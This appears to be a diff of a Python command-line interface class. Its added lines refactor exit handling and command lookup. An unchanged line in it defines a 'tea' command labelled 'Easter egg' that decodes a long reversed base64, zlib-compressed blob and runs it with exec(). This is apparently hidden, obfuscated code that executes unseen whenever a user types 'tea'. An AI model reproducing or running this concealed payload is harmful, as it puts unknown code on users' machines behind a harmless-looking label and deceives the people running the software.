@@ -31,13 +31,14 @@ class CommandLineInterface:
 		self._command_prefix: str = command_prefix
 		self._commands: List[CommandModel] = []
 		self._color_helper: ColorHelper = ColorHelper()
+		self._exit_requested: bool = False
 
 		if initialize_with_help_command:
 			self.add_command(["help", "?"], "Displays this help message.", self.print_help)
 
 		self.add_command(['cheese'], "Easter egg.", self._cheese_command)
 		self.add_command(['tea'], "Easter egg.", self._tea_command)
-		self.add_command(['exit', 'quit', 'q', 'e'], "Quits the application.", exit_command)
+		self.set_exit_command(exit_command)
 
 		self._logger.debug("Successfully initialized CommandLineInterface", separator=log_module_sep)
 
@@ -47,13 +48,35 @@ class CommandLineInterface:
 	def _tea_command(self) -> None:
 		_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
 
+	def set_exit_command(self, exit_command: Callable):
+		keys = ['exit', 'quit', 'q', 'e']
+
+		if not self._command_exists(keys):
+			self.add_command(keys, "Quits the application.", exit_command)
+		else: self._replace_command(keys, exit_command, [])
+
+	def exit_conversation_loop(self):
+		self._exit_requested = True
+
 	def _command_exists(self, keys: List[str]) -> bool:
+		altered_keys = [f"{self._command_prefix}{key}" for key in keys]
+
 		for command in self._commands:
 			for command_key in command.commands:
-				if command_key in keys:
+				if command_key in altered_keys:
 					return True
 
 		return False
+
+	def _replace_command(self, keys: List[str], new_action: Callable, new_arguments: List[Any]) -> None:
+		altered_keys = [f"{self._command_prefix}{key}" for key in keys]
+
+		for command in self._commands:
+			for command_key in command.commands:
+				if command_key in altered_keys:
+					command.action = new_action
+					command.arguments = new_arguments
+					return
 
 	def add_command(self, keys: List[str], description: str, action: Callable, arguments: List[Any] = None) -> None:
 		"""
@@ -108,18 +131,21 @@ class CommandLineInterface:
 
         Does nothing if the original command does not exist.
         """
+		altered_keys = [f"{self._command_prefix}{key}" for key in original_aliases]
 
 		if not self._command_exists(original_aliases):
 			self._logger.warning(f"Command with keys {original_aliases} does not exist. Skipping.")
 			return
 
 		for command in self._commands:
-			if command.commands == original_aliases:
+			if command.commands == altered_keys:
 				command.keys.append(added_alias)
 				return
 
 	def start_listen_loop(self):
-		while True:
+		self._exit_requested = False
+		
+		while not self._exit_requested:
 			self._get_user_command()
 
 	def _get_user_command(self):
